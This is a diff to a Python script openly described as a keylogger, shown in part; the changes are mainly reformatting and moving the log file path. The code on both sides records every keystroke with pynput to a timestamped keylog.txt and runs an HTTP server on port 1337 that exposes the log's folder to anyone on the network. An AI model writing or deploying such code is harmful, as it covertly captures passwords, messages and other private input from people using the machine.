@@ -10,23 +10,21 @@ import argparse
 import http.server
 import logging
 import os
-from pathlib import Path
-from pynput import keyboard
 import threading
+from pathlib import Path
+
+from pynput import keyboard
 
 
 def logger():
-    """ simple function to log keystrokes to keylog.txt """
+    """simple function to log keystrokes to keylog.txt"""
     # configuring the logging module
     logging.basicConfig(
         # Log to the file "keylog.txt"; create it if it doesn't exist
-        filename=f"{file_dir}/keylog/keylog.txt",
-
+        filename=f"{file_dir}/keylog.txt",
         # setting the logging level to DEBUG which logs all messages
         level=logging.DEBUG,
-
         # Use the specified date/time format.
-
         # Used directives and their values:
         # %a = abbreviated weekday name
         # %b = abbreviated month name
@@ -35,13 +33,12 @@ def logger():
         # %H = hour (24-hour clock) as a decimal number
         # %M = minute as a decimal number
         # %S = second as a decimal number
-        datefmt='%a %b %d | %Y | %H:%M:%S',
-
+        datefmt="%a %b %d | %Y | %H:%M:%S",
         # The format of the log.
-
         # %(asctime)s = the date and time of the log
         # %(message)s = the logged message
-        format="%(asctime)s - %(message)s")
+        format="%(asctime)s - %(message)s",
+    )
 
     def on_press(key: str) -> None:
         # logs the key to the keylog.txt file
@@ -53,8 +50,8 @@ def logger():
 
 
 def server() -> None:
-    """ open an http server on port 1337 uploading the keylog.txt file """
-    os.chdir(f"{file_dir}/keylog")
+    """open an http server on port 1337 uploading the keylog.txt file"""
+    os.chdir(f"{file_dir}")
     server = http.server.HTTPServer(("", 1337), http.server.SimpleHTTPRequestHandler)
     server.serve_forever()
 
@@ -67,18 +64,15 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Keylogger")
 
     # add arguments
-    parser.add_argument("-c",
-                        "--clear",
-                        action="store_true",
-                        help="clear the keylog.txt file")
-    parser.add_argument("-l",
-                        "--logger",
-                        action="store_true",
-                        help="start the local keylogger")
-    parser.add_argument("-s",
-                        "--server",
-                        action="store_true",
-                        help="start an http server on port 1337")
+    parser.add_argument(
+        "-c", "--clear", action="store_true", help="clear the keylog.txt file"
+    )
+    parser.add_argument(
+        "-l", "--logger", action="store_true", help="start the local keylogger"
+    )
+    parser.add_argument(
+        "-s", "--server", action="store_true", help="start an http server on port 1337"
+    )
 
     # parse the arguments
     args = parser.parse_args()
@@ -86,7 +80,7 @@ if __name__ == "__main__":
     # check if the clear argument is passed
     if args.clear:
         # clear the keylog.txt file
-        with open(f"{file_dir}/keylog/keylog.txt", "w") as f:
+        with open(f"{file_dir}/keylog.txt", "w") as f:
             f.write("")
 
     # check if the logger argument is passed
